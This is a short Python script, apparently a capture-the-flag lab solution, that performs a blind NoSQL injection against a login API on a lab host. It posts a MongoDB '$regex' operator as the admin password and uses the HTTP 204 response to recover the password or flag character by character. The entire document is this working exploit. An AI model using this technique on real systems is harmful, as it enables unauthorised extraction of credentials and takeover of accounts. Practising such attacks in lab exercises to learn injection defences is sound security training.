import requests

url = "http://web0x01.hbtn/api/a3/nosql_injection/login"
# Common hex/alphanumeric chars for flags
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
flag = ""

print("Reconstructing flag character by character...")

while True:
    found = False
    for c in chars:
        # Check if the password starts with our current flag + this character
        payload = {"username": "admin", "password": {"$regex": "^" + flag + c}}
        r = requests.post(url, json=payload)
        
        # 204 is our 'True' signal
        if r.status_code == 204:
            flag += c
            print(f"Current flag: {flag}")
            found = True
            break
    if not found:
        break

print(f"\nFinal Flag: {flag}")
